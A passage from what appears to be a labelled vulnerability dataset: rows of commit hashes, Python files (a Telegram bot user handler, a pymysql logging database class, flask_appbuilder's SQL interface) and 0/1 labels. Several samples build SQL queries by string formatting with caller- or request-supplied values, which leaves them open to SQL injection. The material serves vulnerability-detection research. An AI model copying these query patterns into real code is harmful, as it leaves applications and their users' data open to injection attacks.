                 f""last_name='{user.last_name}' ""
                 f""WHERE chat_id={user.chat_id}"")

        try:
            db.add(query)
        except DatabaseError:
            log.error(""Could not update info about %s in the database"",
                      user)
        else:
            log.debug(""User's info has been updated"")

    def find_one(self, message: Message) -> User:
        """"""
        Look up a user by a message which we get together with request
        from Telegram
        :param message: object from Telegram that contains info about user's
        message and about himself
        :return: user object that represents a Telegram user in this bot
        """"""

        # look up user in the cache of the bot
        user = self.users.get(message.chat.id, None)

        if user:
            return user

        # otherwise look up the user in the database
        log.debug(""Looking up the user in the database as it doesn't ""
                  ""appear in cache"")
        query = (f'SELECT first_name, nickname, last_name, language '
                 f'FROM users '
                 f'WHERE chat_id={message.chat.id}')

        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:

            # Even if the database in unreachable add user to dictionary
            # with users otherwise the bot will crash requesting this
            # user's info
            log.error('Cannot lookup the user with chat_id %d in database',
                      message.chat.id)
            msg = message.from_user
            user = self.add_new_one(message.chat.id, msg.first_name,
                                    msg.last_name, msg.username,
                                    language='en-US', add_to_db=False)
            return user

        if not cursor.rowcount:
            # This user uses our photoGPSbot for the first time as we
            # can't find him in the database
            log.info('Adding totally new user to the system...')
            msg = message.from_user
            user = self.add_new_one(message.chat.id, msg.first_name,
                                    msg.last_name, msg.username,
                                    language='en-US')
            bot.send_message(config.MY_TELEGRAM,
                             text=f'You have a new user! {user}')
            log.info('You have a new user! Welcome %s', user)

        # finally if the user wasn't found in the cache of the bot, but was
        # found in the database
        else:
            log.debug('User %d has been found in the database',
                      message.chat.id)

            user_data = cursor.fetchall()[0]
            user = self.add_new_one(message.chat.id, *user_data,
                                    add_to_db=False)

        return user

    def __str__(self):
        return ('Instance of a handler of users. '
                f'There is {len(self.users)} users in cache right now.')
/n/n/n",1
136,136,b2029c81a9d2991b84e34d5b18f69bad6c8a479c,"database.py/n/nimport pymysql.cursors
from datetime import date, datetime
import json
import config

class Database:
	def __init__(self):
		self.conn = pymysql.connect(user=config.mysql_credentials[""user""], \
									password=config.mysql_credentials[""password""], \
									host=config.mysql_credentials[""host""], \
									db=config.mysql_credentials[""database""],
									cursorclass=pymysql.cursors.DictCursor)
		self.cur = self.conn.cursor()

	def __enter__(self):
		return DBase()

	def __exit__(self, exc_type, exc_val, exc_tb):
		if self.conn:
			self.cur.close()
			self.conn.close()

	def insert_query_log(self, lhash, text, search, qhash, ip, browser): 	
		sql = ""INSERT INTO log_query (log_hash, query_text, query_search, query_hash, query_time, client_ip, client_browser, clicked) VALUES"" + \
					""({}, {}, {}, '{}', '{}', '{}', {}, {})"".format(json.dumps(lhash), json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser), 0)
		self.cur.execute(sql)
		self.conn.commit()
		return self.cur.lastrowid

	def insert_result_log(self, qid, hoax, fact, unknown, unrelated, conclusion):
		sql = ""INSERT INTO log_result (id_query, finished_at, hoax_score, fact_score, unknown_score, unrelated_score, conclusion) VALUES"" + \
					""(%s, %s, %s, %s, %s, %s, %s)""
		self.cur.execute(sql, (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion))
		self.conn.commit()
		return self.cur.lastrowid

	def insert_result_feedback(self, qhash, is_know, reason, label, ip, browser):
		sql = ""INSERT INTO feedback_result (query_hash, reported_at, is_know, reason, feedback_label, client_ip, client_browser) VALUES"" + \
					""(%s, %s, %s, %s, %s, %s, %s)""
		self.cur.execute(sql, (qhash, datetime.now(), is_know, reason, label, ip, browser))
		self.conn.commit()
		return self.cur.lastrowid

	def insert_reference_feedback(self, ahash, is_relevant, reason, label, ip, browser):
		print(str(ahash))
		print(str(is_relevant))
		sql = ""INSERT INTO feedback_reference (article_hash, reported_at, is_relevant, reason, feedback_label, client_ip, client_browser) VALUES"" + \
					""(%s, %s, %s, %s, %s, %s, %s)""
		self.cur.execute(sql, (ahash, datetime.now(), is_relevant, reason, label, ip, browser))
		self.conn.commit()
		return self.cur.lastrowid

	def insert_references(self, qid, articles):
		insert_values = []
		for article in articles:
			insert_values.append((qid, str(article[""qhash""]), str(article['hash']), str(article['date']), str(article['url']), article['content'], datetime.now())) 	
		sql = ""INSERT INTO article_reference (id_query, query_hash, article_hash, article_date, article_url, article_content, retrieved_at) VALUES"" + \
				"","".join(""(%s, %s, %s, %s, %s, %s, %s)"" for _ in insert_values)
		flattened_values = [item for sublist in insert_values for item in sublist]
		self.cur.execute(sql, flattened_values)
		self.conn.commit()

	def is_query_exist(self, loghash):
		sql = ""SELECT id FROM log_query WHERE log_hash = '%s'"" % (loghash)
		self.cur.execute(sql)
		self.conn.commit()
		return (self.cur.rowcount == 1)

	def is_reference_exist(self, ahash):
		sql = ""SELECT id FROM article_reference WHERE article_hash = '%s'"" % (ahash)
		self.cur.execute(sql)
		self.conn.commit()
		return (self.cur.rowcount == 1)

	def get_query_by_loghash(self, loghash):
		sql = ""SELECT * FROM log_query WHERE log_hash = '%s' LIMIT 1"" % (loghash)
		self.cur.execute(sql)
		self.conn.commit()
		query = self.cur.fetchone()
		return query

	def get_query_log(self):
		sql = ""SELECT * FROM log_query ORDER BY query_time DESC""
		self.cur.execute(sql)
		self.conn.commit()
		queries = []
		for row in self.cur.fetchall():
			query = {}
			query[""log_hash""] = row[""log_hash""]
			query[""query_text""] = row[""query_text""]
			query[""query_search""] = row[""query_search""]
			query[""query_hash""] = row[""query_hash""]
			query[""query_time""] = str(row[""query_time""])
			query[""client_ip""] = row[""client_ip""]
			query[""client_browser""] = row[""client_browser""]
			query[""clicked""] = row[""clicked""]
			queries.append(query)
		return queries

	def del_reference_by_qhash(self, qhash):
		sql = ""DELETE FROM article_reference WHERE query_hash = '%s'"" % (qhash)
		self.cur.execute(sql)
		self.conn.commit()		

	def get_reference_by_qhash(self, qhash):
		sql = ""SELECT * FROM article_reference WHERE query_hash = '%s'"" % (qhash)
		self.cur.execute(sql)
		self.conn.commit()
		articles = []
		if (self.cur.rowcount > 0):
			for row in self.cur.fetchall():
				article = {}
				article[""hash""] = row[""article_hash""]
				article[""date""] = row[""article_date""]
				article[""url""] = row[""article_url""]
				article[""content""] = row[""article_content""]
				articles.append(article)
		return articles

	def get_reference_feedback(self):
		## VIWEW HELPER #1
		sql = ""CREATE OR REPLACE VIEW feedback_reference_result AS SELECT article_hash, is_relevant, feedback_label, COUNT(*) AS count FROM feedback_reference GROUP BY article_hash, is_relevant, feedback_label""
		self.cur.execute(sql)
		self.conn.commit()

		## VIWEW HELPER #2
		sql = ""CREATE OR REPLACE VIEW feedback_reference_max AS (SELECT article_hash, is_relevant, feedback_label, count FROM feedback_reference_result WHERE count = (SELECT MAX(count) FROM feedback_reference_result i WHERE i.article_hash = feedback_reference_result.article_hash))""
		self.cur.execute(sql)
		self.conn.commit()

		## THE QUERY
		sql = ""SELECT log_query.id, log_query.query_text, log_query.query_search, article_reference.article_content, feedback_reference_max.is_relevant, feedback_reference_max.feedback_label FROM feedback_reference_max LEFT JOIN article_reference ON article_reference.article_hash = feedback_reference_max.article_hash LEFT JOIN log_query ON log_query.id = article_reference.id_query""
		self.cur.execute(sql)
		self.conn.commit()

		feedbacks = {}
		for row in self.cur.fetchall():
			feedback = {}
			feedback[""query_text""] = row[""query_text""]
			feedback[""query_search""] = row[""query_search""]
			feedback[""article_content""] = row[""article_content""]
			feedback[""is_relevant""] = row[""is_relevant""]
			feedback[""feedback_label""] = row[""feedback_label""]
			#feedbacks.append(feedback)
			if not (row[""id""] in feedbacks):
				feedbacks[row[""id""]] = []
			feedbacks[row[""id""]].append(feedback)
		return feedbacks

	def check_query(self, qhash): 	
		sql = ""INSERT INTO log_query (query_text, query_search, query_hash, query_time, client_ip, client_browser) VALUES"" + \
					""({}, {}, '{}', '{}', '{}', {})"".format(json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser))
		self.cur.execute(sql)
		self.conn.commit()
/n/n/n",0
137,137,b2029c81a9d2991b84e34d5b18f69bad6c8a479c,"/database.py/n/nimport pymysql.cursors
from datetime import date, datetime
import json
import config

class Database:
	def __init__(self):
		self.conn = pymysql.connect(user=config.mysql_credentials[""user""], \
									password=config.mysql_credentials[""password""], \
									host=config.mysql_credentials[""host""], \
									db=config.mysql_credentials[""database""],
									cursorclass=pymysql.cursors.DictCursor)
		self.cur = self.conn.cursor()

	def __enter__(self):
		return DBase()

	def __exit__(self, exc_type, exc_val, exc_tb):
		if self.conn:
			self.cur.close()
			self.conn.close()

	def insert_query_log(self, lhash, text, search, qhash, ip, browser): 	
		sql = ""INSERT INTO log_query (log_hash, query_text, query_search, query_hash, query_time, client_ip, client_browser, clicked) VALUES"" + \
					""({}, {}, {}, '{}', '{}', '{}', {}, {})"".format(json.dumps(lhash), json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser), 0)
		self.cur.execute(sql)
		self.conn.commit()
		return self.cur.lastrowid

	def insert_result_log(self, qid, hoax, fact, unknown, unrelated, conclusion):
		sql = ""INSERT INTO log_result (id_query, finished_at, hoax_score, fact_score, unknown_score, unrelated_score, conclusion) VALUES"" + \
					""('%s', '%s', '%s', '%s', '%s', '%s', '%s')"" % (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion)
		self.cur.execute(sql)
		self.conn.commit()
		return self.cur.lastrowid

	def insert_result_feedback(self, qhash, is_know, reason, label, ip, browser):
		sql = ""INSERT INTO feedback_result (query_hash, reported_at, is_know, reason, feedback_label, client_ip, client_browser) VALUES"" + \
					""('%s', '%s', '%s', '%s', '%s', '%s', '%s')"" % (qhash, datetime.now(), is_know, reason, label, ip, browser)
		self.cur.execute(sql)
		self.conn.commit()
		return self.cur.lastrowid

	def insert_reference_feedback(self, ahash, is_relevant, reason, label, ip, browser):
		print(str(ahash))
		print(str(is_relevant))
		sql = ""INSERT INTO feedback_reference (article_hash, reported_at, is_relevant, reason, feedback_label, client_ip, client_browser) VALUES"" + \
					""('%s', '%s', '%s', '%s', '%s', '%s', '%s')"" % (ahash, datetime.now(), is_relevant, reason, label, ip, browser)
		self.cur.execute(sql)
		self.conn.commit()
		return self.cur.lastrowid

	def insert_references(self, qid, articles):
		insert_values = []
		for article in articles:
			insert_values.append((qid, str(article[""qhash""]), str(article['hash']), str(article['date']), str(article['url']), article['content'], datetime.now())) 	
		sql = ""INSERT INTO article_reference (id_query, query_hash, article_hash, article_date, article_url, article_content, retrieved_at) VALUES"" + \
				"","".join(""(%s, %s, %s, %s, %s, %s, %s)"" for _ in insert_values)
		flattened_values = [item for sublist in insert_values for item in sublist]
		self.cur.execute(sql, flattened_values)
		self.conn.commit()

	def is_query_exist(self, loghash):
		sql = ""SELECT id FROM log_query WHERE log_hash = '%s'"" % (loghash)
		self.cur.execute(sql)
		self.conn.commit()
		return (self.cur.rowcount == 1)

	def is_reference_exist(self, ahash):
		sql = ""SELECT id FROM article_reference WHERE article_hash = '%s'"" % (ahash)
		self.cur.execute(sql)
		self.conn.commit()
		return (self.cur.rowcount == 1)

	def get_query_by_loghash(self, loghash):
		sql = ""SELECT * FROM log_query WHERE log_hash = '%s' LIMIT 1"" % (loghash)
		self.cur.execute(sql)
		self.conn.commit()
		query = self.cur.fetchone()
		return query

	def get_query_log(self):
		sql = ""SELECT * FROM log_query ORDER BY query_time DESC""
		self.cur.execute(sql)
		self.conn.commit()
		queries = []
		for row in self.cur.fetchall():
			query = {}
			query[""log_hash""] = row[""log_hash""]
			query[""query_text""] = row[""query_text""]
			query[""query_search""] = row[""query_search""]
			query[""query_hash""] = row[""query_hash""]
			query[""query_time""] = str(row[""query_time""])
			query[""client_ip""] = row[""client_ip""]
			query[""client_browser""] = row[""client_browser""]
			query[""clicked""] = row[""clicked""]
			queries.append(query)
		return queries

	def del_reference_by_qhash(self, qhash):
		sql = ""DELETE FROM article_reference WHERE query_hash = '%s'"" % (qhash)
		self.cur.execute(sql)
		self.conn.commit()		

	def get_reference_by_qhash(self, qhash):
		sql = ""SELECT * FROM article_reference WHERE query_hash = '%s'"" % (qhash)
		self.cur.execute(sql)
		self.conn.commit()
		articles = []
		if (self.cur.rowcount > 0):
			for row in self.cur.fetchall():
				article = {}
				article[""hash""] = row[""article_hash""]
				article[""date""] = row[""article_date""]
				article[""url""] = row[""article_url""]
				article[""content""] = row[""article_content""]
				articles.append(article)
		return articles

	def get_reference_feedback(self):
		## VIWEW HELPER #1
		sql = ""CREATE OR REPLACE VIEW feedback_reference_result AS SELECT article_hash, is_relevant, feedback_label, COUNT(*) AS count FROM feedback_reference GROUP BY article_hash, is_relevant, feedback_label""
		self.cur.execute(sql)
		self.conn.commit()

		## VIWEW HELPER #2
		sql = ""CREATE OR REPLACE VIEW feedback_reference_max AS (SELECT article_hash, is_relevant, feedback_label, count FROM feedback_reference_result WHERE count = (SELECT MAX(count) FROM feedback_reference_result i WHERE i.article_hash = feedback_reference_result.article_hash))""
		self.cur.execute(sql)
		self.conn.commit()

		## THE QUERY
		sql = ""SELECT log_query.id, log_query.query_text, log_query.query_search, article_reference.article_content, feedback_reference_max.is_relevant, feedback_reference_max.feedback_label FROM feedback_reference_max LEFT JOIN article_reference ON article_reference.article_hash = feedback_reference_max.article_hash LEFT JOIN log_query ON log_query.id = article_reference.id_query""
		self.cur.execute(sql)
		self.conn.commit()

		feedbacks = {}
		for row in self.cur.fetchall():
			feedback = {}
			feedback[""query_text""] = row[""query_text""]
			feedback[""query_search""] = row[""query_search""]
			feedback[""article_content""] = row[""article_content""]
			feedback[""is_relevant""] = row[""is_relevant""]
			feedback[""feedback_label""] = row[""feedback_label""]
			#feedbacks.append(feedback)
			if not (row[""id""] in feedbacks):
				feedbacks[row[""id""]] = []
			feedbacks[row[""id""]].append(feedback)
		return feedbacks

	def check_query(self, qhash): 	
		sql = ""INSERT INTO log_query (query_text, query_search, query_hash, query_time, client_ip, client_browser) VALUES"" + \
					""({}, {}, '{}', '{}', '{}', {})"".format(json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser))
		self.cur.execute(sql)
		self.conn.commit()
/n/n/n",1
146,146,2158db051408e0d66210a99b17c121be008e20b6,"flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(""%s %s"" % (order_column, order_direction))
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/nflask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data


def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by


def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages


def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes


def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            order_direction = request.args.get('_od_' + re_match[0])
            if order_direction in ('asc', 'desc'):
                orders[re_match[0]] = (request.args.get(arg), order_direction)
    return orders


def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",0
147,147,2158db051408e0d66210a99b17c121be008e20b6,"/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
